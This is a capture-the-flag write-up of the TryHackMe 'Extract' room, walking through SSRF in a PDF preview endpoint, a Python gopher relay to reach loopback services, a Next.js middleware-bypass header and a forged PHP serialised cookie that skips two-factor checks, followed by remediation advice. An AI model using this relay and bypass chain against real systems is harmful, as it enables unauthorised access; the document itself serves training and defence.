# Extract Challenge ![Banner](./../IMAGES/extract_img.png?raw=true)

**Pathway:** *Web Application Red Teaming* | **Section:** *Chaining Vulnerabilities* | **Challenge:** *[Extract](https://tryhackme.com/room/extract)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **22 July 2026**.
>
> **Spoiler warning:** This write-up documents the full exploitation chain, although credentials, exact challenge-specific values and flag codes are not shown.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The assessment was performed from my own Kali Linux VM using the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, internal hostnames, sensitive cookie values, exact exploit values or other challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **Licence:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

Extract is a web application red-teaming challenge built around a fictional online library. The objective was to identify and chain several weaknesses in order to retrieve two protected flags.

The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Enumerating the externally exposed services.
3. Discovering a PDF preview endpoint that accepted a user-controlled URL.
4. Confirming server-side request forgery by making the target connect back to the Kali VM.
5. Using the SSRF weakness to reach a web service bound to the target's loopback interface.
6. Identifying a protected Next.js route on the internal service.
7. Building a local gopher-based relay so that arbitrary HTTP headers could be sent through the SSRF endpoint.
8. Bypassing the Next.js middleware and recovering the first flag together with redacted portal credentials.
9. Reconfiguring the relay to reach a localhost-only management portal on the main Apache service.
10. Authenticating to the portal and obtaining a PHP serialised authentication cookie.
11. Modifying the trusted Boolean value inside the serialised cookie.
12. Bypassing the second-factor check and recovering the second flag.

No real-world systems were targeted. All testing was performed inside the TryHackMe lab environment.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: extract.thm
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> extract.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts extract.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected routing result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important in TryHackMe challenges. Many rooms depend on hostname-based routing, virtual hosts, redirects, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti - technically functional, but rarely helpful.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/extract\.thm/d' /etc/hosts
```

The correct mapping can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for confirming VPN routing and the `tun0` address.
- `getent` for validating local hostname resolution.
- `nmap` for TCP port, service and default-script enumeration.
- `gobuster`, `dirsearch`, `feroxbuster` and `ffuf` for web content discovery.
- Firefox Developer Tools for reviewing the page source and iframe behaviour.
- cURL for interacting with the application and reproducing requests outside the browser.
- Penelope for hosting a temporary HTTP service and observing the SSRF callback.
- Python 3 for implementing a local gopher-to-HTTP relay.
- Nano for editing the relay script.
- Standard Linux utilities such as `sed`, `cat` and `grep` for file and output handling.

Click [HERE](https://github.com/Valikahn/TryHackMe-Web-Application-Red-Teaming#tools-commonly-used) to return to the repository README.

## Initial Enumeration

### Port and Service Discovery

A full TCP scan was performed against the room hostname:

```bash
nmap -T4 -n -sC -sV -Pn -p- extract.thm
```

The principal findings were:

```text
22/tcp open  ssh
80/tcp open  http
```

Service detection identified:

```text
SSH: OpenSSH on Ubuntu
HTTP: Apache HTTP Server on Ubuntu
Page title: TryBookMe - Online Library
```

No additional externally accessible TCP services were identified. This became important later because the internal application discovered during exploitation was not directly exposed to the VPN network.

### Web Content Discovery

Initial directory enumeration was performed with Gobuster:

```bash
gobuster dir \
  -u http://extract.thm/ \
  -w /usr/share/wordlists/dirb/big.txt
```

Relevant results included:

```text
/javascript/
/management/
/pdf/
/server-status
```

The management route returned `403 Forbidden`, while the PDF directory returned an empty response.

Further enumeration was performed with Dirsearch, Feroxbuster and FFUF. These scans identified the important PHP endpoint:

```text
/preview.php
```

A direct request showed that it expected a URL parameter:

```bash
curl -s -i http://extract.thm/preview.php
```

Response:

```text
Missing ?url param.
```

### Reviewing the Public Application

The application source was requested with cURL:

```bash
curl -s -i http://extract.thm/
```

The page presented two PDF documents and used JavaScript to load the selected file into an iframe. The important client-side behaviour was equivalent to:

```javascript
iframe.src = 'preview.php?url=' + encodeURIComponent(url);
```

The document links referenced an internal hostname:

```text
http://<REDACTED>/pdf/<REDACTED>.pdf
```

This showed that the browser supplied a URL to `preview.php`, after which the server retrieved the file. That architecture made server-side request forgery a strong possibility.

### Confirming the Restricted Management Area

Direct external access to the management portal was tested:

```bash
curl -s -i http://extract.thm/management/
```

The application returned:

```text
HTTP/1.1 403 Forbidden
Access denied.
```

This suggested that the route used a source-based access restriction rather than ordinary HTTP authentication.

## Exploits

### Confirming Server-Side Request Forgery

Penelope was started from `/tmp/VK/` in HTTP server mode:

```bash
penelope -s .
```

The important listener address was:

```text
http://<TUN0_IP>:8000/
```

The vulnerable endpoint was then instructed to retrieve a resource from the Kali VM:

```bash
curl -s -i \
  'http://extract.thm/preview.php?url=http://<TUN0_IP>:8000/VK/'
```

Penelope recorded an HTTP request originating from `<TARGET_IP>` rather than from the local browser. This proved that `preview.php` performed the request on the server side.

The vulnerability therefore provided a route into services reachable from the target but not directly reachable from the attacker.

### Discovering the Internal Next.js Service

The SSRF endpoint was used to probe a loopback-only web service on a challenge-specific port:

```bash
curl -s -i \
  'http://extract.thm/preview.php?url=http://127.0.0.1:<REDACTED>/'
```

The response revealed a Next.js application titled `TryBookMe API`. Its navigation included a protected API route:

```text
/customapi
```

Requesting the route normally through SSRF returned the same warning page as the internal home page. This indicated that middleware was rewriting or redirecting unauthorised requests before the route handler was reached.

### Why a Gopher Relay Was Required

The original SSRF interface allowed control over the destination URL but did not provide a convenient way to attach arbitrary HTTP headers.

A local relay was therefore created with the following flow:

```text
cURL -> local TCP relay -> preview.php -> gopher://127.0.0.1:<REDACTED> -> internal Next.js service
```

The relay accepted a complete HTTP request on `127.0.0.1:5000`, URL-encoded it twice and placed it inside a `gopher://` URL. The vulnerable preview endpoint then delivered those bytes to the internal service.

The challenge-specific script used during the lab is shown below with sensitive values redacted:

```python
#!/usr/bin/env python3

import socket
import threading
import urllib.parse

import requests

LHOST = "127.0.0.1"
LPORT = 5000

TARGET_HOST = "<TARGET_IP>"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = <REDACTED>


def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)

        if not data:
            return

        payload = urllib.parse.quote(
            urllib.parse.quote(data)
        )

        target_url = (
            f"http://{TARGET_HOST}/preview.php"
            f"?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}"
            f"/_{payload}"
        )

        try:
            response = requests.get(target_url, timeout=15)
            conn.sendall(response.content)
        except requests.RequestException as error:
            conn.sendall(f"Proxy request failed: {error}\n".encode())


def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LHOST, LPORT))
    server.listen(5)

    print(f"[*] Listening on {LHOST}:{LPORT}")
    print(
        f"[*] Relaying through {TARGET_HOST} "
        f"to {HOST_TO_PROXY}:{PORT_TO_PROXY}"
    )

    while True:
        client_socket, addr = server.accept()
        threading.Thread(
            target=handle_client,
            args=(client_socket, addr),
            daemon=True,
        ).start()


if __name__ == "__main__":
    start_server()
```

The proxy was started with:

```bash
python3 /tmp/VK/proxy.py
```

Expected output:

```text
[*] Listening on 127.0.0.1:5000
[*] Relaying through <TARGET_IP> to 127.0.0.1:<REDACTED>
```

### Next.js Middleware Bypass

The protected route was requested through the local relay while supplying the middleware-bypass header. The exact challenge value has been redacted:

```bash
curl -s -i \
  -H 'x-middleware-subrequest: <REDACTED>' \
  http://127.0.0.1:5000/customapi
```

The internal application returned the actual `/customapi` page rather than the warning page. The response disclosed:

```text
Portal username: <REDACTED>
Portal password: <REDACTED>
First flag: THM{....}
```

The first flag was therefore obtained by chaining:

```text
SSRF -> internal service discovery -> gopher request smuggling -> middleware bypass
```

### Reaching the Localhost-Only Management Portal

The leaked credentials did not work through HTTP Basic Authentication because the management area used an HTML login form and also restricted access by source address.

The relay destination was changed from the internal Next.js port to Apache on loopback port `80`:

```bash
sed -i \
  's/PORT_TO_PROXY = <REDACTED>/PORT_TO_PROXY = 80/' \
  /tmp/VK/proxy.py
```

After restarting the proxy, the management page was requested locally:

```bash
curl -s -i http://127.0.0.1:5000/management/
```

This time the application returned:

```text
HTTP/1.1 200 OK
TryBookMe - Login
```

The result proved that the source-IP restriction trusted requests arriving through loopback. The SSRF relay therefore acted as an access-control bypass.

### Authenticating to the Management Portal

The redacted credentials recovered from the internal API were submitted as form data:

```bash
curl -s -i \
  -c /tmp/VK/management.cookies \
  -d 'username=<REDACTED>&password=<REDACTED>' \
  http://127.0.0.1:5000/management/
```

Successful authentication returned a redirect to the two-factor page:

```text
HTTP/1.1 302 Found
Location: 2fa.php
```

The response also set two cookies:

```text
PHPSESSID=<REDACTED>
auth_token=<REDACTED>
```

### PHP Serialised Cookie Manipulation

URL-decoding the `auth_token` revealed a PHP serialised object containing a Boolean property used to track whether two-factor validation had succeeded.

Its logical structure was:

```text
O:<REDACTED>:"<REDACTED>":1:{s:<REDACTED>:"validated";b:0;}
```

The critical value was:

```text
b:0
```

This represented Boolean `false`. The cookie was modified so that the property became:

```text
b:1
```

The forged cookie and valid PHP session were then supplied to the two-factor endpoint:

```bash
curl -s -i \
  -b 'PHPSESSID=<REDACTED>; auth_token=<REDACTED>' \
  http://127.0.0.1:5000/management/2fa.php
```

The server trusted the client-controlled serialised value and treated the two-factor check as complete.

The response disclosed:

```text
Second flag: THM{....}
```

The final weakness was not merely serialisation itself. The more serious design failure was using an unsigned client-controlled cookie to make an authorisation decision.

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The target route and `tun0` address were verified before scanning. `extract.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring that the web application was accessed through its expected hostname.

### 2. External Service Discovery
Nmap identified SSH and Apache HTTP services. No internal application port was directly exposed to the VPN network.

### 3. Web Enumeration
Directory discovery identified `/management/`, `/pdf/` and `/preview.php`. The management route returned `403`, while `preview.php` required a `url` parameter.

### 4. Client-Side Source Review
The public application passed internal PDF URLs to `preview.php`. This showed that the web server fetched documents on behalf of the visitor.

### 5. SSRF Confirmation
The preview endpoint was pointed at Penelope on `<TUN0_IP>`. The callback arrived from `<TARGET_IP>`, proving server-side request execution.

### 6. Internal Service Discovery
The SSRF primitive reached a Next.js service bound to `127.0.0.1:<REDACTED>`. The service exposed a protected `/customapi` route.

### 7. Gopher Relay
A Python relay accepted raw local HTTP requests, double-encoded them and delivered them through `preview.php` using the gopher protocol.

### 8. Middleware Bypass
A specially formed `x-middleware-subrequest` header caused the internal Next.js middleware to be skipped. The protected route disclosed redacted credentials and the first flag:

```text
THM{....}
```

### 9. Localhost Management Access
The relay was reconfigured to send requests to `127.0.0.1:80`. The management portal accepted the request because it originated from the target's loopback interface.

### 10. Portal Authentication
The leaked credentials were submitted to the management login form. The server created a PHP session and returned a serialised `auth_token` cookie.

### 11. Two-Factor State Manipulation
The cookie stored a client-controlled Boolean property named `validated`. Changing it from false to true caused the server to treat two-factor authentication as complete.

### 12. Final Objective
The forged cookie was sent to `2fa.php`, which returned the second and final flag:

```text
THM{....}
```

## Key Lessons

Extract demonstrated several important penetration-testing and defensive-security lessons:

- Confirm VPN routing and hostname resolution before troubleshooting application behaviour.
- Keep `/etc/hosts` tidy when using a personal Kali VM for TryHackMe rooms.
- Client-side JavaScript often exposes useful endpoints, internal hostnames and application flow.
- A URL preview or document-fetching feature should always be treated as a potential SSRF surface.
- SSRF should be validated with an attacker-controlled callback rather than inferred solely from page behaviour.
- Services bound to loopback are not automatically secure when an internet-facing application can make local requests.
- Port scans show only what is reachable externally; SSRF can reveal a very different internal attack surface.
- Gopher can transform a limited URL-fetch primitive into a method for sending custom protocol data.
- Middleware must not be treated as the sole security boundary for sensitive routes.
- Source-IP restrictions are fragile when another application on the same host can issue requests.
- Leaked credentials should be tested against the correct authentication mechanism rather than assumed to be HTTP Basic credentials.
- Client-controlled serialised objects must never be trusted for authentication or authorisation state.
- A Boolean such as `validated=true` is not proof that an authentication step actually occurred.
- Multi-factor authentication provides little protection when its completion state can be forged.
- Complex compromises often result from several individually modest weaknesses being chained together.
- Public write-ups should document the reasoning and technique without publishing live credentials, exact flags or unnecessary challenge giveaways.

The central lesson was the importance of following trust boundaries. The public library trusted its preview function, the internal API trusted middleware, the management portal trusted localhost and the two-factor page trusted a cookie. Each control appeared plausible in isolation, but the complete chain allowed every boundary to be crossed.

## Remediation Notes

### SSRF Prevention

- Avoid accepting arbitrary URLs from untrusted users.
- Use a strict allow-list covering scheme, hostname, port and path.
- Resolve hostnames before making requests and reject loopback, private, link-local and reserved address ranges.
- Revalidate the resolved address after every redirect.
- Disable redirects unless they are explicitly required.
- Permit only `http` and `https` when server-side fetching is necessary.
- Explicitly block protocols such as `gopher`, `file`, `ftp` and `dict`.
- Restrict outbound network access from the web service using firewall or container policy.
- Route server-side fetching through a hardened proxy with explicit destination controls.
- Return only the minimum response data required by the feature.

### Internal Service Protection

- Do not assume that binding a service to `127.0.0.1` is a complete security control.
- Require authentication and authorisation on every sensitive internal route.
- Separate public and internal services into distinct network segments or containers.
- Apply service-to-service authentication rather than trusting network location.
- Log and alert on unexpected requests to loopback-only services.
- Minimise information exposed by internal application error pages and navigation links.

### Next.js and Middleware Security

- Keep Next.js and related dependencies fully patched.
- Review vendor security advisories and upgrade promptly when middleware-bypass issues are disclosed.
- Do not rely exclusively on middleware for authentication or authorisation.
- Repeat access-control checks inside sensitive route handlers or server actions.
- Strip untrusted internal framework headers at the reverse proxy.
- Use an explicit allow-list for headers forwarded from external clients.
- Add automated tests that request protected routes with unusual middleware-related headers.

### Management Portal Access Controls

- Replace source-IP checks with strong authenticated access controls.
- Require role-based authorisation for all management functions.
- Place management interfaces behind a dedicated VPN, identity-aware proxy or administrative network.
- Do not grant privileged access merely because a request originates from loopback.
- Apply defence in depth so that SSRF cannot inherit administrative trust.
- Record and review all successful and failed management login attempts.

### Credential Management

- Never expose reusable credentials through maintenance pages or API responses.
- Store secrets in a dedicated secrets-management system.
- Rotate any credential disclosed in source code, logs, backups or internal pages.
- Prevent password reuse between services.
- Use short-lived service credentials wherever possible.
- Apply rate limiting and account lockout controls to management authentication.

### Cookie and Session Security

- Never store authoritative authentication state in an unsigned client-side value.
- Store multi-factor completion state on the server and associate it with the active session.
- Sign and authenticate any client-side token using a modern, well-reviewed construction.
- Reject modified, malformed or unexpected serialised data.
- Avoid native-language object serialisation for untrusted input.
- Use simple, versioned data structures such as securely signed JSON only when client-side state is genuinely required.
- Set session cookies with `HttpOnly`, `Secure` and an appropriate `SameSite` policy.
- Regenerate the session identifier after successful authentication and after completing MFA.
- Expire partially authenticated sessions quickly.

### Multi-Factor Authentication

- Confirm MFA completion through server-side state that cannot be altered by the client.
- Bind the MFA transaction to the authenticated session, user and short expiry time.
- Require a fresh challenge after session changes or suspicious activity.
- Do not permit direct access to post-MFA routes based on a cookie Boolean.
- Add tests for cookie manipulation, replay and direct endpoint access.

### Operational Hygiene

- Keep `/etc/hosts` limited to active lab mappings.
- Remove stale challenge entries after each room.
- Maintain separate working directories for scan output, scripts, cookies and evidence.
- Record the target, hostname and `tun0` details at the beginning of each engagement.
- Validate each stage of an attack chain before moving to the next.
- Stop temporary listeners and proxy scripts once the lab is complete.
- Remove locally stored session cookies and challenge credentials after documentation is finished.

## Disclaimer

This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
